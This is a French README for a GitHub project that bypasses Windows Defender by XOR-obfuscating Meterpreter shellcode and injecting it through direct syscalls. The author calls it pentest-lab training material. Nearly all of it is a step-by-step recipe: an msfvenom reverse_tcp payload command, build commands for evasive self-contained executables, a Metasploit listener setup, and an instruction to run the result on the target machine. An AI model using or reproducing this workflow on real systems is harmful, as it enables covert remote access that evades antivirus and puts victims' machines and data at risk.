Scripts permettant de contourner la protection antivirale de Windows Defender via la technique de Direct Syscalls avec une injection de shellcode préalablement obfusqué avec un fonction XOR.



Ces derniers ont été utilisés dans un lab d'entrainement au pentest et ne sont pas prévus pour être utilisés en dehors de ce cadre.

<br /><br />
-----------------------------------------------------
<br />

<p align="center">
    Ma vidéo sur le sujet : <a href="https://youtu.be/n5r2jc2X6lc"><strong>https://youtu.be/n5r2jc2X6lc</strong></a>
  </p>

<br /><br />
-----------------------------------------------------
<br />



<h2 align="center">Bypass-AV-DirectSyscalls</h2>

  <p align="center">
    Ce projet est basé sur le dépôt Github de chvancooten :
    <br />
    <a href="https://github.com/chvancooten/OSEP-Code-Snippets"><strong>https://github.com/chvancooten/OSEP-Code-Snippets</strong></a>
  </p>
</div>

<br /><br />





### Utilisation

1. Générer un meterpreter Metasploit sous la forme d'un shellcode avec msfvenom :
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<SERVER> LPORT=<PORT> -f csharp
```
2. Créer un nouveau projet DotNet dans Visual Studio Code :
```  
dotnet new console
```
3. Remplacer le contenu de Program.cs par le contenu du fichier XorCipher.cs et remplacer le shellcode par celui généré avec msfvenom
4. Générer la solution sous la forme d'un fichier PE avec ses librairies embarquée :
```
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```
5. Exécuter le fichier compilé dans une invite de commande :
```
.\XorCipher.exe
```
6. Créer un second projet DotNet dans une autre instance de Visual Studio Code :
```
dotnet new console
```
7. Remplacer le contenu de Program.cs par le contenu du fichier DirectSyscalls.cs et remplacer le shellcode par celui généré avec XorCipher.exe
8. Générer la solution sous la forme d'un fichier PE avec ses librairies embarquée :
```
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```
9. Lancer un listener dans la console metasploit :
```
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <SERVER>
set lport <PORT>
exploit
```
10. Exécuter le fichier DirectSyscalls.exe sur le poste cible puis savourer un délicieux cookie aux pépites de chocolat :)




-----------------------------------------------------------------------------------




<p align="center">
    Le lien de mon blog : <a href="https://lestutosdeprocessus.fr"><strong>https://lestutosdeprocessus.fr</strong></a>
    <br />
    <br />
    Le lien pour rejoindre le serveur Discord : <a href="https://discord.gg/JJNxV2h"><strong>https://discord.gg/JJNxV2h</strong></a>
</p>



 
